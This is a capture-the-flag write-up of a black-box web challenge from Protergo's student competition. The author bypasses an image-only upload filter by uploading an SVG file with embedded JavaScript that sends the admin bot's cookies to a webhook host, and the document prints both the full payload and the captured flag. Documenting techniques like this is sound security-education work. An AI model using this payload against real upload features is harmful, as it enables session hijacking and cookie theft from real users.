---
tags:
  - CTF
  - protergo
  - web-exploitation
  - "#client-side"
  - xss
  - file-upload
title: Protergo CTF - [Control]
---
![[Screenshot 2024-02-08 at 23.12.45.png]]
# Prologue

An Individual local competition that held by [Protergo](https://protergo.id/)company. The competition was starting from 1st February until 8th February. This competition is only limited to students.
# Write Up

## TL;DR Solution

1. There's a file upload feature.
2. In the description, there's a hint that an admin will visit our input.
3. Upload SVG with an embedded XSS payload to get the cookie.

## Detailed Explanation

A black box challenge. There's no source code in the challenge. 
![[Screenshot 2024-02-08 at 23.15.41.png]]

Visiting the link, will be given a form upload.
![[Screenshot 2024-02-08 at 23.16.09.png]]

Since the description mentions something like `admin will visit`, I already knows that it's a client-side challenge. With this, I attempts to fill all input with the XSS payload. But, there's no callback from the webhook.

Since there's file upload, I attempts to upload an HTML file, but the application rejects it, and the file must be an image
![[Screenshot 2024-02-08 at 23.29.40.png]]

Since SVG is considered an image, and I can embed Javascript inside it.
![[Screenshot 2024-02-08 at 23.31.14.png]]

As the picture above, the extension becomes `svg` even though the I tried to uploads a `png` extension.
## Exploitation

By this, We already know how to bypass the upload protection to achieve XSS.

Upload this SVG file, and usually in client side challenge, flag is located in cookies.
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      location="http://webhook/"+document.cookie
   </script>
</svg>
```

![[Screenshot 2024-02-08 at 23.35.49.png]]

After waiting for a few minutes, I receives the flag from the bot.
![[Screenshot 2024-02-08 at 23.37.30.png]]

FLAG: `PROTERGO{57d64a838c5158de42a706bf1e0195ee27406d551d29a217ed0706e8347824b0}`